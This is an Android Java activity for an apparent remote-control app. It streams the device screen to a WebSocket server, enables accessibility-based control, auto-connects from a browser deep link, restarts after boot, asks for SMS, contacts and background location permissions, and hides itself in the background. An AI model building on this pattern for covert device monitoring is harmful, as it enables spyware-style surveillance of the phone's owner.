package com.remote.control;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int SCREEN_CAPTURE_REQUEST = 1001;

    private EditText serverUrlInput;
    private EditText sessionIdInput;
    private TextView statusText;
    private TextView fpsText;
    private Button btnStart;
    private Button btnStop;
    private Button btnAccessibility;

    private MediaProjectionManager projectionManager;
    private SharedPreferences prefs;

    private ActivityResultLauncher<Intent> screenCaptureLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("remote_control", MODE_PRIVATE);

        serverUrlInput = findViewById(R.id.serverUrl);
        sessionIdInput = findViewById(R.id.sessionId);
        statusText = findViewById(R.id.statusText);
        fpsText = findViewById(R.id.fpsText);
        btnStart = findViewById(R.id.btnStart);
        btnStop = findViewById(R.id.btnStop);
        btnAccessibility = findViewById(R.id.btnAccessibility);

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        // Check for deep link (auto-connect from browser)
        handleDeepLink(getIntent());

        // Check if launched from boot receiver
        handleBootStart(getIntent());

        // Restore saved values
        serverUrlInput.setText(prefs.getString("server_url", "wss://remote-control-1dev.onrender.com"));
        sessionIdInput.setText(prefs.getString("session_id", ""));

        // Register screen capture permission launcher
        screenCaptureLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
                    startCaptureService(result.getResultCode(), result.getData());
                } else {
                    Toast.makeText(this, "Permission de capture refusee", Toast.LENGTH_SHORT).show();
                }
            }
        );

        btnStart.setOnClickListener(v -> startCapture());
        btnStop.setOnClickListener(v -> stopCapture());
        btnAccessibility.setOnClickListener(v -> openAccessibilitySettings());

        // Request runtime permissions for admin features
        requestDataPermissions();

        // Update UI based on service state
        updateUI();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
    }

    private void startCapture() {
        String serverUrl = serverUrlInput.getText().toString().trim();
        String sessionId = sessionIdInput.getText().toString().trim();

        if (serverUrl.isEmpty() || sessionId.isEmpty()) {
            Toast.makeText(this, "Remplissez l'URL et le Session ID", Toast.LENGTH_SHORT).show();
            return;
        }

        // Save preferences
        prefs.edit()
            .putString("server_url", serverUrl)
            .putString("session_id", sessionId)
            .apply();

        // Request screen capture permission
        Intent captureIntent = projectionManager.createScreenCaptureIntent();
        screenCaptureLauncher.launch(captureIntent);
    }

    private void startCaptureService(int resultCode, Intent data) {
        String serverUrl = serverUrlInput.getText().toString().trim();
        String sessionId = sessionIdInput.getText().toString().trim();

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("resultCode", resultCode);
        serviceIntent.putExtra("data", data);
        serviceIntent.putExtra("serverUrl", serverUrl);
        serviceIntent.putExtra("sessionId", sessionId);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        statusText.setText("Connecte - Streaming...");
        statusText.setTextColor(0xFF00FF88);
        btnStart.setVisibility(android.view.View.GONE);
        btnStop.setVisibility(android.view.View.VISIBLE);
    }

    private void stopCapture() {
        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        stopService(serviceIntent);

        statusText.setText("Deconnecte");
        statusText.setTextColor(0xFFFF4444);
        btnStart.setVisibility(android.view.View.VISIBLE);
        btnStop.setVisibility(android.view.View.GONE);
        fpsText.setText("");
    }

    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
        Toast.makeText(this, "Activez 'Remote Control' dans la liste", Toast.LENGTH_LONG).show();
    }

    private void updateUI() {
        boolean serviceRunning = ScreenCaptureService.isRunning;
        if (serviceRunning) {
            statusText.setText("Connecte - Streaming...");
            statusText.setTextColor(0xFF00FF88);
            btnStart.setVisibility(android.view.View.GONE);
            btnStop.setVisibility(android.view.View.VISIBLE);
        } else {
            statusText.setText("Deconnecte");
            statusText.setTextColor(0xFFFF4444);
            btnStart.setVisibility(android.view.View.VISIBLE);
            btnStop.setVisibility(android.view.View.GONE);
        }

        boolean accessibilityEnabled = RemoteControlService.instance != null;
        if (accessibilityEnabled) {
            btnAccessibility.setText("Accessibilite: ACTIVE");
            btnAccessibility.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF006600));
        } else {
            btnAccessibility.setText("Activer Accessibilite (controle)");
            btnAccessibility.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF333355));
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleDeepLink(intent);
    }

    private void handleDeepLink(Intent intent) {
        if (intent == null || intent.getData() == null) return;
        android.net.Uri uri = intent.getData();
        if (uri == null) return;

        // Deep link format: remotecontrol://connect?server=URL&session=ID
        String server = uri.getQueryParameter("server");
        String session = uri.getQueryParameter("session");

        if (server != null && !server.isEmpty()) {
            prefs.edit().putString("server_url", server).apply();
            if (serverUrlInput != null) serverUrlInput.setText(server);
        }
        if (session != null && !session.isEmpty()) {
            prefs.edit().putString("session_id", session).apply();
            if (sessionIdInput != null) sessionIdInput.setText(session);
        }

        // Auto-start if both are provided
        if (server != null && session != null && !server.isEmpty() && !session.isEmpty()) {
            Toast.makeText(this, "Connexion automatique...", Toast.LENGTH_SHORT).show();
            // Slight delay to let UI initialize
            new android.os.Handler().postDelayed(this::startCapture, 500);
        }
    }

    private void handleBootStart(Intent intent) {
        if (intent == null) return;
        if (!intent.getBooleanExtra("auto_start_from_boot", false)) return;

        String serverUrl = intent.getStringExtra("server_url");
        String sessionId = intent.getStringExtra("session_id");

        if (serverUrl != null && !serverUrl.isEmpty()) {
            serverUrlInput.setText(serverUrl);
        }
        if (sessionId != null && !sessionId.isEmpty()) {
            sessionIdInput.setText(sessionId);
        }

        // Auto-start capture after a short delay (let UI fully init)
        new android.os.Handler().postDelayed(this::startCapture, 1000);
    }

    private void requestDataPermissions() {
        String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION
        };

        java.util.List<String> needed = new java.util.ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 2001);
        }

        // Background location requires separate request on Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                // Must request after fine location is granted
                new android.os.Handler().postDelayed(() -> {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                            == PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 2002);
                    }
                }, 2000);
            }
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        // If service is running, minimize to background silently
        if (ScreenCaptureService.isRunning) {
            moveTaskToBack(true);
        }
    }
}
